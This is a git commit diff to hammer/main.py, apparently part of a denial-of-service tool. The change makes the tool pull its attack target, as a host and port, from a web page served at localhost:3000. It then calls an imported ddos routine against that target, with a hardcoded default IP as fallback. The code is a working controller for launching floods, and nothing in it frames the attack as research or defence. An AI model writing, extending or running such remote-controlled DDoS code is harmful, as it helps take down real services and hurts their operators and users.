c30bb1f70a106bbc7ee7a646980fea937306881c
Kirill <k1rill-sm@ya.ru>
2016-09-19 21:43:50 +0300

    Data from an API

--- hammer/main.py
+++ hammer/main.py
@@ -1,18 +1,36 @@
 from ddos import main as ddos
 
-import sys
+import sys, requests
 
+from bs4 import BeautifulSoup
 
+URL = 'http://localhost:3000'
 
-def start():
-  try: host = sys.argv[1]
-  except: host = '77.88.55.55'
+def get_html():
+  req = requests.get(URL)
+  soup = BeautifulSoup(req.text)
 
-  try: port = sys.argv[2]
-  except: port = 80
-  ddos(_host=host, _port=port)
+  global parsed
+  parsed = soup.body
 
+def get_data():
+  addr = {}
+  # get html from website
+  get_html()
+  # get formatted data config
+  data = parsed.h2.get_text().strip().split(':')
 
+  try: addr["host"] = data[0]
+  except: addr["host"] = '77.88.55.55'
+
+  try: addr["port"] = int(data[1])
+  except: addr["port"] = 80
+
+  return addr
+
+def main():
+  data = get_data()
+  ddos(_host=data["host"], _port=data["port"])
 
 if __name__ == '__main__':
-  start()
+  main()
